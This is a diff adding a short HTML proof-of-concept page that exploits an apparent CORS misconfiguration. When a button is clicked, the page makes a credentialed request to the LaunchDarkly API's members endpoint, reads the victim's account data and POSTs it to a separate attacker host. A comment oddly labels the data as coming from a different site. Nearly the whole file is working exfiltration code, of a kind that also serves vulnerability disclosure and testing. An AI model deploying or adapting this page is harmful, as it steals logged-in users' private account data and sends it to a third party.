@@ -1,0 +1,24 @@
+<html>
+<body>
+<button type='button' onclick='cors()'>CORS</button>
+<p id='demo'></p>
+<script>
+function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+var a = this.responseText; // Sensitive data from niche.co about user account
+document.getElementById("demo").innerHTML = a;
+xhttp.open("POST", "http://www.alonebreecher.ml", true);// Sending that data to Attacker's website
+xhttp.withCredentials = true;
+console.log(a);
+xhttp.send("data="+a);
+}
+};
+xhttp.open("GET", "https://app.launchdarkly.com/api/v2/members", true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+</script>
+</body>
+</html>
